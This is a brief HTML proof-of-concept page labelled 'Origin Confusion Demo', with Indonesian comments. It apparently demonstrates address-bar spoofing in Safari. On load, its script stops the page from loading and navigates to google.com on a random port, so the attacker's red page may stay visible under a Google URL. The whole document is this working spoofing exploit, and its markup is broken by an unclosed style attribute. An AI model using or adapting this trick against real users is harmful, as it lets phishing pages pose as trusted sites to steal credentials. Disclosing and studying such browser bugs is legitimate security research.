<body style="
  margin:0;
  background:#b00000;
  color:white;
  font-family:-apple-system;

  <div>

    Origin Confusion Demo

<script>
function spoof() {
    // delay sebentar biar user siap
    setTimeout(() => {
        // Stop loading halaman ini (Safari akan tetap render apa yang sudah terlihat)
        window.stop();

        // pilih port random (tidak 0 atau 443)
        let randomPort;
        do {
            randomPort = Math.floor(Math.random() * 1000);
        } while (randomPort === 0 || randomPort === 443);

        // ganti top-level location
        document.location = "https://google.com:" + randomPort + "/";
    }, 500); // 0.5 detik, cukup untuk render halaman merah

}

// jalankan PoC otomatis
spoof();
</script>
